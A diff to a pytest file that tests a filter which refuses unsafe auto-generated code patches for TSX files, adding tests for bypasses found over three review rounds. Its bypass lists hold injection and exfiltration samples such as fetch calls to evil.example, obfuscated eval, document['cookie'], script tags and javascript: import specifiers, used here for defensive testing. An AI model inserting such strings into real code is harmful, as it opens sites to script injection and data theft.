@@ -155,19 +155,8 @@ def test_only_small_local_same_file_safe_patches_are_storable():
     assert not fm.patch_targets_error(_p(find="not in the file"), ERR31, SRC)
 
 
-@pytest.mark.parametrize("bad", [
-    "import x from 'left-pad'", "import 'evil'", "fetch('https://evil.example/x')", "eval(code)",
-    "new Function('return 1')", "<div dangerouslySetInnerHTML={{__html: h}} />", "<script>1</script>",
-    "require('child_process')", "import('evil')",
-])
-def test_denylisted_replace_text_is_not_stored(bad, factory):
-    assert not fm.is_safe_patch(_p(replace=bad))
-    async def body():
-        async with factory() as s:
-            await fm.record("o", "sig", "tsx:pages", [_p(replace=bad)], session=s)
-            assert await fm.lookup("o", "sig", session=s) == []
-    run(body())
-    assert fm.is_safe_patch(_p(replace="import Card from './Card'"))                      # relative import is fine
+def test_relative_import_is_fine_without_adding_the_import_keyword():
+    assert fm.is_safe_patch(_p(find="import Card from './card'", replace="import Card from './Card'"))
 
 
 def test_replay_targets_the_current_errors_file_not_the_stored_path(factory):
@@ -207,26 +196,55 @@ def test_provenance_is_recorded_and_rows_can_be_purged_by_run(factory):
     run(body())
 
 
-# --- allowlist bypasses (each must be refused) --------------------------------------------------------------------
+# --- token rule: every bypass from the three review rounds must be refused ------------------------------------------
 
 @pytest.mark.parametrize("bad", [
-    "import {\n  a,\n  b\n} from 'left-pad'",                      # multi-line import
-    "export * from 'left-pad'", "export { a } from \"evil\"",      # export ... from
-    "const u = '//evil.example/x.js'", "fetch(`//evil.example`)",  # protocol-relative URL
+    "import x from 'left-pad'", "import 'evil'", "import('evil')",                    # round 1
+    "fetch('https://evil.example/x')", "eval(code)", "new Function('return 1')",
+    "<div dangerouslySetInnerHTML={{__html: h}} />", "<script>1</script>", "require('child_process')",
+    "import {\n  a,\n  b\n} from 'left-pad'",                                         # round 2: multi-line import
+    "export * from 'left-pad'", "export { a } from \"evil\"",                         # export ... from a package
+    "const u = '//evil.example/x.js'", "fetch(`//evil.example`)",                       # protocol-relative URL
     "el.innerHTML = h", "el.outerHTML = h", "el.insertAdjacentHTML('a', h)",
-    "setTimeout('alert(1)', 0)", "setInterval(\"x()\", 5)",
+    "setTimeout('alert(1)', 0)", "setInterval(\"x()\", 5)",                            # string timer
     "window['ev'+'al'](c)", "globalThis['x']", "document['cookie']", "self['fetch']",
-    "const f = new Function('a')", "document.write(x)",
+    "document.write(x)",
+    "const n = 1 /* a */ ; ev/**/al(c)", "const n = 1 // fine, a comment",             # round 3: comments split tokens
+    "a.constructor", "Reflect.get(a, b)", "a?.[k]", "const p = a + '/' + '/'",         # ?.[ and concatenated '//'
+    "const n = 1; x.__proto__ = y", "const n = `t`", "localStorage.x", "n = atob(s)",
+    "const \\u0065val = 1", "ev\\u0061l(c)", "n = \"\\x41\"",                         # escapes
+    "n = 1 + \\ 2",
+    "foo(1)", "n = a[1]",                                                              # added call / computed access
+    "import x from 'javascript:alert(1)'", "import x from '//evil.example/a'", "import x from 'data:text/js,1'",
+    "import x from './a:b'", "import x from './a//b'",
 ])
-def test_allowlist_refuses_bypass(bad):
+def test_token_rule_refuses_bypass(bad):
     assert not fm.is_safe_patch(_p(replace=bad))
 
 
-def test_allowlist_accepts_relative_specifiers_and_specifiers_already_in_find():
-    assert fm.is_safe_patch(_p(replace="import {\n a\n} from '../ui/Card'"))
-    assert fm.is_safe_patch(_p(find="import a from 'react'", replace="import b from 'react'"))
-    assert not fm.is_safe_patch(_p(find="x", replace="import a from 'react'"))   # new package import
-    assert fm.is_safe_patch(_p(replace="const n = 1 // fine, a comment"))
+def test_specifier_already_in_find_is_exact_set_membership_not_substring():
+    ok = dict(find="import a from 'react'", replace="import b from 'react'")
+    assert fm.is_safe_patch(_p(**ok))
+    assert not fm.is_safe_patch(_p(find="import a from 'react-dom'", replace="import b from 'react'"))   # substring only
+    assert not fm.is_safe_patch(_p(find="import a from 'javascript:x'", replace="import b from 'javascript:x'"))
+
+
+def test_fail_closed_when_an_import_cannot_be_parsed():
+    assert not fm.is_safe_patch(_p(find="import a from './a'", replace="import a from"))
+    assert not fm.is_safe_patch(_p(find="import a from './a'", replace="import a from foo"))
+    assert not fm.is_safe_patch(_p(find="import a from './a'", replace="import { a }"))
+    assert not fm.is_safe_patch(_p(find="import a from './a'", replace="import a from './a"))        # unterminated
+
+
+@pytest.mark.parametrize("find,replace", [
+    ("import Card from './components/ui/card'", "import Card from './components/ui/Card'"),   # import path case fix
+    ("<div>\n  <p>hi</p>", "<div>\n  <p>hi</p>\n</div>"),                                    # missing closing tag
+    ("const totl = items.length", "const total = items.length"),                                # identifier rename
+    ("import { A } from './ui'", "import { A, B } from './ui'"),                               # named import, same module
+    ("const n: number = 'x'", "const n: number = 1"),
+])
+def test_legitimate_repairs_stay_storable(find, replace):
+    assert fm.is_safe_patch({"file": "src/a.tsx", "find": find, "replace": replace})
 
 
 def test_replay_skips_a_stored_patch_that_does_not_target_the_current_error_line(tmp_path, factory, monkeypatch):
